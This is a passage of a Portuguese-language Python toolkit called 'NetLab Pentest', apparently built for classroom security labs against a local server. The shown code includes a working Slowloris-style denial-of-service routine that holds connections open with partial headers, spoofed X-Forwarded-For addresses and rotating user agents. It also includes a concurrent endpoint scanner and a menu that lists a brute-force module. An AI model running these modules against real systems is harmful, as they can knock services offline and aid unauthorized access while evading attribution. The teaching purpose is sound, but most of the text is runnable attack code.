        completar nenhuma requisição legítima.
        """
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(self._ip, self._porta),
            timeout=self._timeout,
        )
        # Header incompleto (sem \r\n\r\n no final)
        writer.write(
            f"GET / HTTP/1.1\r\n"
            f"Host: {self._host}\r\n"
            f"User-Agent: {random.choice(_USER_AGENTS)}\r\n"
            f"X-Forwarded-For: {_ip_falso()}\r\n"
            f"Accept-language: pt-BR,pt;q=0.9\r\n".encode()
        )
        await writer.drain()

        # Envia headers falsos para manter a conexão viva
        for _ in range(10):
            writer.write(f"X-Keep: {random.randint(1, 9999)}\r\n".encode())
            await writer.drain()
            await asyncio.sleep(random.uniform(0.5, 1.5))

        writer.close()
        self._tentativas += 1

    async def _loop_stats(self, tempo_fim: float) -> None:
        """Imprime métricas ao vivo a cada segundo."""
        loop = asyncio.get_event_loop()
        ini  = loop.time()
        while loop.time() < tempo_fim:
            passado  = max(loop.time() - ini, 1e-9)
            restante = tempo_fim - loop.time()
            tps      = self._tentativas / passado
            sys.stdout.write(
                f"\r  [+] Enviados: {self._tentativas:,}  "
                f"Recusados: {self._recusados:,}  "
                f"Erros: {self._erros:,}  "
                f"{tps:.1f} req/s  "
                f"Restante: {restante:.0f}s   "
            )
            sys.stdout.flush()
            await asyncio.sleep(1)

    # ── Resultado ─────────────────────────────────────────────────────────────

    def mostrar_resultado(self) -> None:
        tps = self._tentativas / self._duracao
        tabela([
            ["Tipo",           self._tipo.upper()],
            ["Enviados (ok)",  f"{self._tentativas:,}"],
            ["Recusados",      f"{self._recusados:,}  ← servidor sobrecarregado"],
            ["Erros de rede",  f"{self._erros:,}"],
            ["Tempo total",    f"{self._duracao:.2f}s"],
            ["Taxa média",     f"{tps:.1f} req/s"],
        ], ["Métrica", "Valor"], "Resultado — Teste de Estresse")
        info(
            "Verifique a aba Servidor no NetLab: a barra de carga, "
            "o contador de req/s e os alertas de bloqueio mostram o impacto."
        )


# ══════════════════════════════════════════════════════════════════════════════
# Módulo 3 — Scanner de Endpoints
# ══════════════════════════════════════════════════════════════════════════════

class ModuloScanner(BaseAtaque):
    """
    Enumera endpoints do servidor NetLab e analisa os cabeçalhos de resposta.

    O que demonstra
    ────────────────
      • Quais rotas existem (200/301) vs inexistentes (404)
      • Ausência de headers de segurança (HSTS, CSP, X-Frame-Options etc.)
      • Informações expostas nos cabeçalhos Server/X-Powered-By
      • Diferença de comportamento entre modo vulnerável e modo seguro
    """

    def __init__(self) -> None:
        super().__init__()
        self._url_base:   str  = "http://localhost:8080"
        self._concorrencia: int = 20
        self._timeout:    float = 3.0
        self._resultados: List[dict] = []

    def configurar(self) -> None:
        print(f"\n{_CIANO}{_NEGRITO}  ── Configuração: Scanner de Endpoints ──{_RESET}")
        url = entrada("URL base do servidor", "http://localhost:8080")
        self._url_base   = url.rstrip("/")
        self._concorrencia = min(
            int(entrada("Concorrência", "20")), 50
        )
        self._timeout = max(0.1, float(entrada("Timeout (s)", "3.0")))
        ok(f"Scanneando {len(_ENDPOINTS_SCANNER)} endpoints em {self._url_base}")

    def executar(self) -> None:
        asyncio.run(self._executar_async())

    async def _executar_async(self) -> None:
        semaforo   = asyncio.Semaphore(self._concorrencia)
        conector   = aiohttp.TCPConnector(ssl=False) if _AIOHTTP_OK else None
        obj_timeout = aiohttp.ClientTimeout(total=self._timeout) if _AIOHTTP_OK else None

        if not _AIOHTTP_OK:
            self._executar_sync()
            return

        async with aiohttp.ClientSession(
            connector=conector, timeout=obj_timeout
        ) as sessao:
            tarefas = [
                asyncio.create_task(
                    self._scanear_endpoint(sessao, semaforo, endpoint)
                )
                for endpoint in _ENDPOINTS_SCANNER
            ]
            await asyncio.gather(*tarefas, return_exceptions=True)

    async def _scanear_endpoint(self, sessao, semaforo, endpoint: str) -> None:
        url = self._url_base + endpoint
        async with semaforo:
            try:
                async with sessao.get(
                    url, allow_redirects=False,
                    headers={"User-Agent": random.choice(_USER_AGENTS)},
                ) as resp:
                    headers_dict = dict(resp.headers)
                    self._registrar(endpoint, resp.status, headers_dict)
                    self._tentativas += 1
            except Exception as e:
                self._registrar(endpoint, 0, {}, str(e))
                self._erros += 1

    def _executar_sync(self) -> None:
        sessao = _req_sync.Session()
        for endpoint in _ENDPOINTS_SCANNER:
            url = self._url_base + endpoint
            try:
                r = sessao.get(url, timeout=self._timeout, allow_redirects=False)
                self._registrar(endpoint, r.status_code, dict(r.headers))
                self._tentativas += 1
            except Exception as e:
                self._registrar(endpoint, 0, {}, str(e))
                self._erros += 1

    def _registrar(self, endpoint: str, status: int,
                   headers: dict, erro_msg: str = "") -> None:
        """Armazena resultado e imprime em tempo real."""
        # Headers de segurança que deveriam estar presentes
        ausentes = [
            h for h in (
                "Strict-Transport-Security",
                "Content-Security-Policy",
                "X-Frame-Options",
                "X-Content-Type-Options",
            )
            if h not in headers
        ]

        resultado = {
            "endpoint":       endpoint,
            "status":         status,
            "headers":        headers,
            "ausentes":       ausentes,
            "servidor_exposto": headers.get("Server", ""),
            "erro":           erro_msg,
        }
        self._resultados.append(resultado)

        # Impressão ao vivo
        if status == 0:
            cor, simb = _VERM, "✗"
        elif status in (200, 201):
            cor, simb = _VERDE, "✓"
        elif status in (301, 302, 307):
            cor, simb = _AMAR, "→"
        elif status == 404:
            cor, simb = "\033[90m", "·"
        elif status == 429:
            cor, simb = _MAG, "⊘"
        else:
            cor, simb = _CIANO, "?"

        print(
            f"  {cor}{simb}{_RESET} "
            f"{str(status) if status else 'ERR':>3}  "
            f"{endpoint:<30}"
            + (f"  Server: {resultado['servidor_exposto'][:30]}"
               if resultado['servidor_exposto'] else "")
        )

    def mostrar_resultado(self) -> None:
        # Resumo de headers ausentes
        alertas = [
            r for r in self._resultados
            if r["status"] in (200, 201) and r["ausentes"]
        ]

        if alertas:
            print(f"\n  {_AMAR}Headers de segurança ausentes:{_RESET}")
            for r in alertas:
                print(f"    {r['endpoint']}")
                for h in r["ausentes"]:
                    print(f"      {_VERM}✗{_RESET} {h}")

        encontrados = [r for r in self._resultados if r["status"] in (200, 201, 302)]
        tabela([
            ["Endpoints testados", str(len(_ENDPOINTS_SCANNER))],
            ["Encontrados",        str(len(encontrados))],
            ["Erros de rede",      str(self._erros)],
            ["Tempo",              f"{self._tempo_decorrido:.2f}s"],
        ], ["Métrica", "Valor"], "Resultado — Scanner")

        # Lista dos endpoints ativos
        if encontrados:
            info("Endpoints ativos:")
            for r in encontrados:
                print(f"    {r['endpoint']}  [{r['status']}]")


# ══════════════════════════════════════════════════════════════════════════════
# Módulo 4 — Interceptação HTTP (captura formulários em texto puro)
# ══════════════════════════════════════════════════════════════════════════════

class ModuloIntercepcaoHTTP(BaseAtaque):
    """
    Submete formulários ao servidor NetLab e exibe os dados em texto puro,
    demonstrando que qualquer sniffing na rede captura credenciais integralmente.

    Útil para demonstrar em sala de aula por que HTTP é inseguro para login.
    """

    def __init__(self) -> None:
        super().__init__()
        self._url_base: str = "http://localhost:8080"
        self._repeticoes: int = 3

    def configurar(self) -> None:
        print(f"\n{_CIANO}{_NEGRITO}  ── Configuração: Interceptação HTTP ──{_RESET}")
        self._url_base   = entrada("URL base do servidor", "http://localhost:8080").rstrip("/")
        self._repeticoes = int(entrada("Quantas submissões de demonstração", "3"))

    def executar(self) -> None:
        if not _REQUESTS_OK and not _AIOHTTP_OK:
            erro("Nenhuma biblioteca HTTP disponível.")
            return

        endponts_demo = [
            ("/login",     {"usuario": "admin",    "senha": "123456",
                            "email": "admin@lab.local"}),
            ("/formulario",{"nome": "João Silva",   "telefone": "55999999999",
                            "senha": "minhasenha1234"}),
            ("/signup",    {"usuario": "professor", "senha": "102030"}),
        ]

        print(f"\n  {_AMAR}Enviando dados sensíveis via HTTP (sem criptografia)...{_RESET}")
        print(f"  {'─'*60}")

        for i in range(self._repeticoes):
            endpoint, dados = endponts_demo[i % len(endponts_demo)]
            url = self._url_base + endpoint

            # Mostra exatamente o que um sniffer capturaria
            corpo_raw = "&".join(f"{k}={v}" for k, v in dados.items())
            print(f"\n  {_NEGRITO}Requisição #{i+1}:{_RESET}")
            print(f"    {_VERM}POST {url} HTTP/1.1{_RESET}")
            print(f"    Content-Type: application/x-www-form-urlencoded")
            print(f"    {_VERM}Payload (VISÍVEL NA REDE): {corpo_raw}{_RESET}")

            try:
                if _REQUESTS_OK:
                    r = _req_sync.post(
                        url, data=dados, timeout=4.0, allow_redirects=False,
                        headers={"User-Agent": random.choice(_USER_AGENTS)},
                    )
                    status = r.status_code
                else:
                    status = "N/A"
            except Exception as e:
                status = f"ERRO: {e}"

            cor_status = _VERDE if str(status).startswith("2") else _AMAR
            print(f"    {cor_status}→ Resposta HTTP: {status}{_RESET}")
            self._tentativas += 1
            time.sleep(0.5)

        print(f"\n  {'─'*60}")
        print(f"  {_VERM}Qualquer dispositivo na mesma rede Wi-Fi capturaria")
        print(f"  todos esses dados com um simples sniffer (ex.: Wireshark).{_RESET}")
        print(f"\n  {_VERDE}Ative o Modo Análise no NetLab para ver os pacotes capturados{_RESET}")
        print(f"  {_VERDE}em tempo real enquanto esses formulários são submetidos.{_RESET}")

    def mostrar_resultado(self) -> None:
        tabela([
            ["Formulários enviados", str(self._tentativas)],
            ["Protocolo",            "HTTP — sem criptografia"],
            ["Visibilidade",         "TOTAL — qualquer sniffer captura"],
            ["Solução",              "HTTPS obrigatório para dados sensíveis"],
        ], ["Item", "Detalhe"], "Resultado — Interceptação HTTP")


# ══════════════════════════════════════════════════════════════════════════════
# Menu principal
# ══════════════════════════════════════════════════════════════════════════════

_MODULOS = {
    "1": ("Força Bruta Assíncrona",   ModuloBruteForce),
    "2": ("Teste de Estresse / DoS",  ModuloEstresse),
    "3": ("Scanner de Endpoints",     ModuloScanner),
    "4": ("Interceptação HTTP",       ModuloIntercepcaoHTTP),
}


def _verificar_dependencias() -> None:
    """Avisa sobre dependências ausentes mas não bloqueia a execução."""
    ausentes = []
    if not _AIOHTTP_OK:
        ausentes.append("aiohttp  (força bruta e scanner assíncronos)")
    if not _REQUESTS_OK:
        ausentes.append("requests (fallback síncrono e interceptação)")
    if not _RICH_OK:
        ausentes.append("rich     (interface visual aprimorada)")

    if ausentes:
        aviso("Dependências ausentes (funcionalidade reduzida):")
        for a in ausentes:
            print(f"    pip install {a.split()[0]}")
        print()


def menu_principal() -> None:
    limpar_tela()
    banner()
    _verificar_dependencias()

    if _RICH_OK and console:
        console.print("[bold cyan]  Selecione o módulo:[/bold cyan]")
        for chave, (nome, _) in _MODULOS.items():
            console.print(f"    [bold]{chave}[/bold] — {nome}")
        console.print("    [bold]0[/bold] — Sair\n")
    else:
        print(f"  {_CIANO}Selecione o módulo:{_RESET}")
        for chave, (nome, _) in _MODULOS.items():
            print(f"    {chave} — {nome}")
        print(f"    0 — Sair\n")

    opcao = input(f"  {_CIANO}Módulo:{_RESET} ").strip()

    if opcao == "0":
        info("Encerrando NetLab Pentest.")
        sys.exit(0)

    if opcao not in _MODULOS:
        erro("Opção inválida.")
        time.sleep(1)
        menu_principal()
        return

    nome_modulo, ClasseModulo = _MODULOS[opcao]
    print(f"\n  {_NEGRITO}▶  {nome_modulo}{_RESET}")

    try:
        modulo = ClasseModulo()
        modulo.executar_interativo()
    except KeyboardInterrupt:
        aviso("\n  Interrompido.")

    input(f"\n  {_CIANO}Pressione Enter para voltar ao menu...{_RESET}")
    menu_principal()


# ══════════════════════════════════════════════════════════════════════════════
# Ponto de entrada
# ══════════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    try:
        menu_principal()
    except KeyboardInterrupt:
        aviso("\n  Interrompido.")
        sys.exit(0)
